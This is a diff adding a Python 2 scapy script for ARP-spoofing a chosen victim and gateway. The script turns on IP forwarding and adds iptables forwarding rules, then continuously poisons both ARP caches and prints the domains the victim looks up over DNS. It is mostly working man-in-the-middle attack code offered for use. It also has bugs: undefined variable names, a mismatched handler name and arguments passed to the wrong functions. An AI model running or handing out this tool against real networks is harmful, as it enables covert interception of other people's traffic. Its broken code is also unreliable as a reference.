@@ -1,0 +1,149 @@
+#!/usr/bin/python
+
+
+# arp spoofing using scapy to send arp spoof packets, and to sniff dns from victim
+# referenced from https://null-byte.wonderhowto.com/how-to/build-man-middle-tool-with-scapy-and-python-0163525/
+# 	     and ebin.com/1cMu4kzZ
+
+
+# remember that enabling ip_forard for kernel, it will automactically forward packets with dest ip address different from
+# the interface attacker pc is using, and will forward according to routing table, which is to the default gateway
+# then the default gateway will forward along the packets, and same goes for packets going to victim coming from router
+
+#importing modules
+
+import os
+import sys
+import time
+from scapy.all import *
+
+# getting inputs from the user to start off arp spoofing tool
+	# once interuptted with the SIGINT, we are calling shutting down the program
+
+print "[!] MAKE SURE YOU ARE RUNNING AS ROOT"
+
+
+try:
+	interface = raw_input("[*] Enter the Arping and Sniffing Interface: ")
+	victimIP = raw_input("[*] Enter the Victim's IP Address: ")
+	gatewayIP = raw_input("[*] Enter the Gateway Router's IP Address: ")
+except KeyboardInterrupt: # in case of ctrl C: SIGINT
+	print "\n[!] User Requested Shutdown"
+	print "[!] Exiting....." 
+	sys.exit(1)	# exits the program with bash exit code of 1 for failure
+
+# enabling kernel port forwarding, and allowing forward traffic from and to the victim's PC
+	# using os.system, takes one arg of string type
+print "\n[*] Enabling IP Forwarding...\n"
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+	# -s for source, -d for destination
+print "\n[*] Allowing fowarding traffic from and to the Victim's IP\n"
+os.system("iptables -A FORWARD -s " + victimIP + " -j ACCEPT" )
+os.system("iptables -A FORWARD -d "+ victimIP + " -j ACCEPT")
+
+
+# defining get MAC address function
+def getMac(IP):
+	# in order to get the mac address, we will send out an arp broadcast request 
+	# to ask for the hardware address for the specified input IP
+	# also we should turn off verbose from scapy
+	conf.verb = 0
+		# using the send and recieve layer 2 function, arp request has a timeout of 2 seconds
+			# interval of request is every 0.1 seconds
+	(ans, unans) = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP, timeout=2, iface=interface, inter=0.1))
+	print unans
+	print ans
+	for (send, recieve) in ans:  # source would be the hardware that responded to that IP
+		return recieve.sprint(r"%Ether.src%")
+
+# defining the re arp function, for victim and gateway to reunite again
+def reArp():
+	print "\n[!] Restoring Targets........"
+	# first we need to grab each of the MAC addresses then using the layer 3 send function to send a arp with correct values
+	VictimMAC = getMac(VictimIP)
+	GatewayMAC = getMac(gatewayIP)
+	send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=VictimMAC, hwsrc=GatewayMAC, count=7)) # sending this 7 times
+	print "[!] Disabling IP Forward..."
+	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+	print "[!] Shutting Down"
+	sys.exit(1)
+
+
+# defining the arp spoof function, the function that will be responsible of arp spoofing
+def arpSpoof(victimMac, gatewayMac):
+	# arp spoofing gateway, using level 3 send from scapy, op=2 for reponse, and 1 for query
+	send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=victimMac)) # hardware source will be from attacher pc, by scapy default
+	# arp spoofing victim
+	send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=getwayMac))
+
+# defining the dns sniffer handler
+def dnsSniffhandler(pkt): 
+	# filter if the packet is indeed a dns packet
+	# also getting packet DNS layer query resource info, 0 means request packet
+	if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
+		# returning a string for sniff function to print out
+		# need to get the DNS layer's query data information, of query name -> website name that victim has searched for
+		return "Victim: " + victimIP + " has searched for: " + pkt.getlayer(DNS).qd.qname
+
+
+# defining the main mitm function
+	# if unable to grab MAC, system will shutdown
+def mainMITM():
+	try:
+		victimMAC = getMac(victimIP)
+	except Exception: # anything goes wrong in the above block, will cause the termination of the program	
+								    # we wont be flushing the user's iptables setting, 
+								    # since it will restore to original after reboot unless saved
+								    # optional, turning off port forwarding for the user
+		print "[!] Couldn't Find the Victim's MAC"
+		print "[!] Disabling IP Forward"
+		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+		print "[!] Exiting......."
+		sys.exit(1)
+	try: 
+		gatewayMAC = getMac(gatewayIP)
+	except Exception: # same goes for the router 
+		print "[!] Couldn't Find the Gateway Router's MAC"
+		print "[!] Disabling IP Forward"
+		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+		print "[!] Exiting.........."
+		sys.exit(1)
+	while True: 	# setting up an infinite loop to keep arp spoofing the victim and gateway, 1.5 second interval
+		try: 
+			arpSpoof(victimMAC, gatewayMAC)
+			# also lets do a dns sniff, to be outputted using the prn callback, and only need 1 packet per arp spoof loop
+			sniff(iface=interface, filter="udp 53", count=1, prn=dnsSniffHandler)
+			time.sleep(1.5)
+		except KeyboardInterrupt: 	# Ctrl C Signal
+	# in case of interrupt signal while running the arp spoof, we need to reArp the devices to keep stealth
+			reArp()
+			break	# breaking out of the loop
+
+
+# calling the main function, running the script
+mainMITM()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
